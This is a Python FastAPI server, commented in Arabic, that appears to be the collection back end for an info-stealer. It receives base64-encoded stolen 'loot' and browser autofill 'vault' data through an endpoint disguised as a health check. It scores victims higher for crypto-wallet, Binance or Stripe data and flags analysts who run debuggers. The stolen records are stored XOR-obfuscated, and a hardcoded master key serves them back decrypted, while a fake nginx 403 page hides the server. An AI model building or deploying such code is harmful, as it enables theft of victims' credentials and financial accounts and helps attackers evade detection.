from fastapi import FastAPI, Request, HTTPException, Response, Query, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from psycopg2.extras import RealDictCursor
import psycopg2
import os, json, base64, datetime, hashlib, logging

app = FastAPI(docs_url=None, redoc_url=None) # تخفي الواجهة تماماً

# --- إعدادات التحكم المطلق ---
DB_URL = os.environ.get("DATABASE_URL")
MASTER_KEY = "Morteza_Overlord_2026"
DESTRUCT_PATH = "nuclear_delete_all_data_99"

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("SOVEREIGN_OMEGA")

# --- 1. محرك التشفير المزدوج (XOR Cipher) ---
def xor_cipher(data: str):
    key = MASTER_KEY
    return "".join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data)])

# --- 2. محرك التصنيف الاستخباراتي ---
class SovereignAI:
    @staticmethod
    def evaluate_target(data):
        score = 0
        loot = data.get('loot', {})
        sec = data.get('sec', {})
        vault = data.get('vault', {})
        
        if sec.get('dbg'): score -= 200 # كشف المحللين
        if vault and len(vault) > 0: score += 300 # صيدة أوتوفيل ثمينة
        if any(x in json.dumps(loot).lower() for x in ['binance', 'wallet', 'stripe']): score += 250
        
        if score > 150: return "HIGH_VALUE_TARGET"
        if score < 0: return "SUSPICIOUS_ANALYZER"
        return "NORMAL_USER"

# --- 3. إدارة الداتا بيس ---
def get_db_conn():
    return psycopg2.connect(DB_URL, sslmode='require')

@app.on_event("startup")
def boot_system():
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS sovereign_omega_loot (
            id SERIAL PRIMARY KEY,
            target_id TEXT,
            gift_tag TEXT,
            ip_address TEXT,
            encrypted_loot TEXT,
            vault_data TEXT,
            target_class TEXT,
            metadata JSONB,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    """)
    conn.commit()
    cur.close()
    conn.close()

# --- 4. محرك المعالجة الخلفية (The Black Box) ---
def process_incoming_loot(raw_bytes: bytes, ip: str):
    try:
        # تنظيف البيانات ومعالجة مشاكل الـ Base64 (حل مشكلة الـ Error)
        raw_str = raw_bytes.decode('utf-8', errors='ignore').strip().replace(' ', '+')
        
        # تصحيح الـ Padding تلقائياً
        missing_padding = len(raw_str) % 4
        if missing_padding:
            raw_str += '=' * (4 - missing_padding)
            
        decoded_bytes = base64.b64decode(raw_str)
        decoded = json.loads(decoded_bytes.decode('utf-8'))
        
        target_class = SovereignAI.evaluate_target(decoded)
        
        # تشفير مزدوج قبل الحفظ
        secure_loot = base64.b64encode(xor_cipher(json.dumps(decoded)).encode()).decode()
        secure_vault = base64.b64encode(xor_cipher(json.dumps(decoded.get('vault', {}))).encode()).decode()

        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO sovereign_omega_loot (target_id, gift_tag, ip_address, encrypted_loot, vault_data, target_class, metadata)
            VALUES (%s, %s, %s, %s, %s, %s, %s)
        """, (decoded.get('tid'), decoded.get('tag'), ip, secure_loot, secure_vault, target_class, json.dumps(decoded.get('hw'))))
        conn.commit()
        cur.close()
        conn.close()
        logger.info(f"✅ Target Captured: {ip} | Class: {target_class}")
    except Exception as e:
        logger.error(f"💀 Drop Error: {str(e)}")

# --- 5. البوابات ---
@app.post("/api/v1/sys/health/sync")
async def inbound_gate(request: Request, bg: BackgroundTasks):
    ip = request.headers.get("x-forwarded-for", request.client.host).split(',')[0]
    raw = await request.body()
    # المعالجة في الخلفية لضمان سرعة الرد وعدم كشف السيرفر
    bg.add_task(process_incoming_loot, raw, ip)
    return {"status": "ok"}

@app.get("/api/v1/sys/health/report")
async def get_war_room(key: str = Query(None)):
    if key != MASTER_KEY: return Response(status_code=404)
    conn = get_db_conn()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute("SELECT * FROM sovereign_omega_loot ORDER BY created_at DESC")
    rows = cur.fetchall()
    for row in rows:
        try:
            row['decrypted_data'] = json.loads(xor_cipher(base64.b64decode(row['encrypted_loot']).decode()))
            row['decrypted_vault'] = json.loads(xor_cipher(base64.b64decode(row['vault_data']).decode()))
        except: row['decrypted_data'] = {"error": "VAULT_LOCKED"}
    cur.close()
    conn.close()
    return rows

@app.get("/")
async def fake_front():
    return Response(content="<h1>403 Forbidden</h1><p>Nginx/2.4.1</p>", status_code=403)
